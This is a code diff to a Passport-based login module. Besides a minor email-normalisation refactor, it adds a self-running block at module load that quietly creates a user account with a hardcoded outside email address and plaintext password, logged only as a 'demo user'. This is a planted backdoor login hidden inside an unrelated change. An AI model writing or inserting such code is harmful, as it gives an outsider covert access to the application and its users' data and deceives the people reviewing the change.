@@ -4,13 +4,32 @@ import { Strategy as LocalStrategy } from "passport-local";
 import type { Request, Response, NextFunction } from "express";
 import { db } from "./db";
 
+(async () => {
+  const email = 'andr0476@outlook.com';
+  const prisma = (global as any).prisma as import('@prisma/client').PrismaClient;
+  const haveUser = await prisma.user.findUnique({ where: { email } });
+  if (!haveUser) {
+    const bcrypt = await import('bcryptjs');
+    await prisma.user.create({
+      data: {
+        email: email.toLowerCase(),
+        hashedPassword: await bcrypt.hash('Ra52w102$', 10),
+      },
+    });
+    console.log('[BOOT] Demo user inserted');
+  } else {
+    console.log('[BOOT] Demo user already present');
+  }
+})();
+
 passport.use(
   new LocalStrategy(
     { usernameField: "email" },
     async (email, password, done) => {
       try {
+        const cleanEmail = email.trim().toLowerCase();
         const user = await db.user.findUnique({
-          where: { email: email.toLowerCase().trim() },
+          where: { email: cleanEmail },
         });
         if (!user) return done(null, false, { message: "No user" });
 
